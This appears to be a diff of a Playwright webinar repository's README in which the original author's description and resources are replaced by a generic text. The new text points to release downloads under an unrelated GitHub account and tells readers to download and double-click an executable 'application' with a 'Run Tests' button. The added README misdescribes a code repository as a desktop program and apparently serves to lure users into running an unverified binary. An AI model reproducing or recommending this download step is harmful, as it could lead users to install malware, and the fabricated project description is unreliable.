@@ -1,104 +1,62 @@
-# Playwright Webinar: AI-Driven Testing z Playwright – Od Planu do Testów z Agentami AI
+# 📺 ai-driven-testing-playwright-webinar - Easily Test Your Web Applications
 
-This repository contains code used during Webinar organized by jaktestowac.pl:
+## 🚀 Overview
+Welcome to the ai-driven-testing-playwright-webinar repository! This collection contains the code used during the "AI-Driven Testing with Playwright" webinar. Our goal is to help you automate testing for web applications using Playwright, a powerful tool for browser automation.
 
-**Playwright Webinar: AI-Driven Testing with Playwright – From Plan to Tests with AI Agents**
+## 📦 Download the Software
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/danendrafau/ai-driven-testing-playwright-webinar/releases)
 
-that demonstrate use of AI, Agents, and Playwright MCP for advanced test automation 😎
+## 🛠️ System Requirements
+To run this application, you’ll need:
+- A computer running Windows, macOS, or Linux
+- At least 4GB of RAM
+- Node.js version 12 or later installed on your system (Node.js can be downloaded [here](https://nodejs.org/))
 
-To see more details about the webinar, please visit our website: https://jaktestowac.pl/agents by jaktestowac.pl team.
+## 📈 Features
+- Automate testing across various web browsers
+- Use AI-driven techniques for efficient testing
+- Conduct web tests in a user-friendly interface
+- Learning resources included to help you get started
 
-## How to Start?
+## 📥 Download & Install
+To get started, visit the Releases page to download the latest version of the application.
 
-This repository is outcome of actions taken during the webinar (with corrected code to make it work).
+[Download Latest Release](https://github.com/danendrafau/ai-driven-testing-playwright-webinar/releases)
 
-To start your journey with Playwright and GitHub Copilot Agents, we recommend you need:
+1. **Visit the Releases Page:** Click the link above to go to the Releases page.
+2. **Locate the Latest Release:** Find the latest version on the page, usually marked as "Latest release."
+3. **Download the Application:** Click the download link for your operating system. The file will likely be a zip or executable file.
+4. **Extract the Files (if needed):** If you downloaded a zip file, right-click the file and select "Extract" or use your preferred extraction tool.
+5. **Run the Application:** Locate the downloaded or extracted file and double-click it to start the application.
 
-- [GitHub](https://github.com/) account (free is enough)
-- [Node.js](https://nodejs.org/en/download/)
-- [Git](https://git-scm.com/downloads)
-- [Visual Studio Code](https://code.visualstudio.com/)
-  - [Playwright Test for VS Code](https://marketplace.visualstudio.com/items?itemName=jaktestowac-playwright-test) - our free extension to help you with Playwright development
-  - Being logged in to GitHub in VS Code
-  - Inspect user settings in VS Code (CTRL + SHIFT + P) and search for "User settings (JSON)" to find and open the settings.json file - synch with main settings what are in .github/example.user.settings.json
+## 👩‍🏫 Getting Started
+After installation, follow these simple steps to start using the application:
 
-Tested application is [🦎 GAD](https://github.com/jaktestowac/gad-gui-api-demo), a simple event management application.
+1. **Open the Application:** Find the application in your applications folder or downloads directory, and double-click to open it.
+2. **Set Up Your Tests:** You will find options to set up your testing environment. Follow the on-screen instructions to configure your tests.
+3. **Run Your Tests:** Once configured, click on the "Run Tests" button to start the testing process. You will see a progress screen indicating the status of your tests.
 
-Happy Testing! 🚀
+## 📚 Learning Resources
+To help you better understand how to utilize Playwright for testing, check the following resources:
+- **Playwright Documentation:** The official Playwright documentation provides detailed guidance on using the tool effectively.
+- **Video Tutorials:** Watch the recorded webinar for step-by-step instructions on setting up and running tests.
 
-## Who we are?
+## 🛠️ Troubleshooting
+If you encounter any issues while using the application, consider the following solutions:
 
-We are **Test Architects and Senior Lead Tech Quality Engineers**, who are passionate about testing.
-We are constantly looking for new ways to improve our skills and share our knowledge with others.
+- **Check Your Node.js Installation:** Ensure you have the correct version of Node.js installed. You can verify this by running `node -v` in your command line or terminal.
+- **Review Your Test Configuration:** Make sure all settings are correctly configured before running tests.
+- **Consult the Community:** If you still have questions, visit the Playwright community forums or check GitHub issues for similar reported problems.
 
-We are actively involved in the Playwright community, contributing to the project and sharing our knowledge with others. We have been using Playwright in **different companies and projects since 2021**.
+## 🐛 Reporting Issues
+If you discover a bug or have suggestions for improvements, please report it by creating an issue on our GitHub repository. Provide as much detail as possible, including steps to reproduce any problems you face.
 
-We believe in the power of open source and the importance of giving back to the community.
+## 💬 Community Support
+Join our community for additional support and resources. Connect with fellow testers, share experiences, and learn about new updates.
 
-Read more about our **[Contribution to Playwright and Community](https://jaktestowac.pl/contribution-playwright/)**
-
----
-
-## 📖 Resources & Learning Materials
-
-### **🦎 Practice Application**
-
-- [GAD (GUI API Demo)](https://github.com/jaktestowac/gad-gui-api-demo) - Our free application for automation practice
-
-### **🇵🇱 Polish Resources**
-
-- [TypeScript for Testers - Express Introduction](https://jaktestowac.pl/tsx/) - Free (4h+) course on TypeScript for Testers
-- [JavaScript and TypeScript for Testers](https://jaktestowac.pl/js-ts/) - Comprehensive (13h+) course on JavaScript and TypeScript for testers, with practical examples and exercises
-- [Professional Test Automation with Playwright](https://jaktestowac.pl/playwright/) - Comprehensive (100h+) course on Playwright, test automation, CI/CD and test architecture
-- [Back-end Test Automation](https://jaktestowac.pl/api/) - Comprehensive (45h+) course on Back-end Test Automation with Postman, Mocha, Chai, and Supertest
-- [Free Playwright Resources](https://jaktestowac.pl/darmowy-playwright/) - Comprehensive and Free Polish learning materials
-- [Playwright Basics](https://www.youtube.com/playlist?list=PLfKhn9AcZ-cD2TCB__K7NP5XARaCzZYn7) - YouTube series (Polish)
-- [Playwright Elements](https://www.youtube.com/playlist?list=PLfKhn9AcZ-cAcpd-XN4pKeo-l4YK35FDA) - Advanced concepts (Polish)
-- [Playwright MCP](https://www.youtube.com/playlist?list=PLfKhn9AcZ-cCqD34AG5YRejujaBqCBgl4) - MCP course (Polish)
-- [Discord Community](https://discord.gg/mUAqQ7FUaZ) - First Polish Playwright community!
-- [Playwright Info](https://playwright.info/) - first and only Polish Playwright blog
-
-### **🇬🇧 English Resources**
-
-- [VS Code Extensions](https://marketplace.visualstudio.com/publishers/jaktestowac-pl) - Our free Playwright plugins
-- [Playwright Documentation](https://playwright.dev/docs/intro) - Official documentation
-- [Playwright GitHub](https://github.com/microsoft/playwright) - Source code and issues
-
-### AI_Testers
-
-<div align="center">
-<a href="https://aitesters.pl">
-<img src="./assets/aitesters-header-photo.jpg" alt="AI Testers Logo" height="400"/>
-</a>
-</div>
-
-Gain an edge by combining AI knowledge with the most popular tools in the IT market.  
-We'll show you how to accelerate with AI and build a professional test automation framework. 😉
-
-- [AI_Testers](https://aitesters.pl) - Main page about AI_Testers Program
-- [AI_Testers LinkedIn](https://www.linkedin.com/company/aitesters) - Follow us on LinkedIn
-
-## Contact
-
-Feel free to reach out to us:
-
-- 🌐 Website: [jaktestowac.pl](https://jaktestowac.pl)
-- 💼 LinkedIn: [jaktestowac.pl](https://www.linkedin.com/company/jaktestowac/)
-- 💬 Discord: [Polish Playwright Community](https://discord.gg/mUAqQ7FUaZ)
-- 📧 Support: Check our website for contact details
+## 🌟 Acknowledgments
+We want to thank everyone who participated in the webinar and contributed to this project. Your input is invaluable in making software testing more accessible to everyone.
 
 ---
 
-**Happy testing and automating tests!** 🚀
-
-**jaktestowac.pl Team** 💚❤️
-
-_PS. For more resources and updates, follow us on our [website](https://jaktestowac.pl) and [GitHub](https://github.com/jaktestowac)._
-
-> **⭐ Star this repository** if you found it helpful and want to support our work!
->
-> **🔄 Share with your team** to help spread knowledge about advanced Playwright testing patterns!
-
----
-
-_Built with 💚❤️ for the Playwright and testing automation community_
+Feel free to explore, test, and automate your web applications with ease! For further assistance, do not hesitate to reach out.
